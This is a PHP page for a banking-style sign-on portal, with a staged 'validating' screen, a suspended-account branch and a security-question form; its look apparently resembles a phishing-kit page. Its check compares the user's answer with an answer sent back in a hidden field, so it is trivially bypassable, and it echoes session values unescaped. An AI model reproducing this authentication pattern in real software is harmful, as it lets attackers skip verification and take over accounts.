<?php if(!isset($_SESSION)){session_start();} ?><html><head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="robots" content="noindex,nofollow">
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
    <script type="text/javascript" src="../js/jquery.min.js"></script>

<script type="text/javascript" src="../js/jquery.timer.js"></script>
<link rel="stylesheet" type="text/css" href="portal.css">

<?php
unset($error);
if((isset($_POST["pass"]) && ($_POST["pass"])== $_POST["ans"]))
{$logg=1; }elseif((isset($_POST["pass"]) && ($_POST["pass"])!= $_POST["ans"])){
	$error="You have entered an incorrect answer";
	}
?>

<script src="//code.tidio.co/mgnhouvgxohr01fxtyzdspbfthzjsdoi.js" async></script></head><body>
<style type="text/css">html, body {background-image:url('../images/pageBG.gif');}
#container{margin:0 auto; width:751px}td{text-align:left}</style>
<div id="container"><div id="banner">

<a id="logo"><span></span></a></div>
<div style="padding:0px 10px"><hr />
<?php if(isset($logg)){?><form method="post" action="/s/online/portal/home.php" id="logged"><input type="hidden" name="logged" value="logged" /><p style="text-align:center; margin:150px 0">Redirecting... Please wait</p><script type="text/javascript">setTimeout(function(){$("#logged").submit()},3000)</script></form>

<?php }elseif((isset($_POST['val']) && ($_POST['val']=="Suspended" )) && (!isset($logged ))){?><div style="text-align:center; margin:150px 0"><b>Account is Suspended!</b><br/>&nbsp;<br/><a href="/">&lsaquo; Back </a></div><?php }

elseif((!isset($_POST['val']))&&(!isset($_POST['pass']))){?><form method="post" action="" id="login">
<input type="hidden" name="val" value="<?php echo $_SESSION['a']; ?>" /><p>Please wait while we validate your sign-on information.</p><div style="text-align:center; margin:150px 0"><img src="../images/progress_bar.gif" alt="signing on..." border="none" /></div><script type="text/javascript">setTimeout(function(){$("#login").submit()},5000)</script></form>

<?php }elseif((isset($_POST['val']) && ($_POST['val']=="Active" ) && (!isset($logged ))) ||((isset($_POST['pass'])))){ ?><div style="margin:150px 0; text-align:center"><b><span style='color:red'> <?php if(isset($error)){echo $error; }?></span></b>

  <table style="margin:20px 0 0 150px;width:630px">  
    <tr><td style="width:1px"></td><td align="left" style="font-size:12px;"><b><span><?php echo $_SESSION['e'] ?></span></b></td></tr>
    
    <tr style="margin-bottom:4px;"><td style="text-align:right; font-size:12px;"><p style="margin-top:0px;">Answer&nbsp;</p></td><td><form method="post"  action="<?php echo $_SERVER['PHP_SELF']?>">
<input name="pass" id="pass" type="text" maxlength="20" value="" required>
<input name="ans" id="ans" type="hidden"  value="<?php echo $_SESSION['f'] ?>">
<a href="../index.php" style=" font-size:12px;color:a70027;">Cancel</a></td></tr>
<tr ><td></td><td><input type="submit" value="Submit" style="background:#a70027;"></td></tr></table></div></form><?php }else{header("location:/");} ?></div></div></body></html>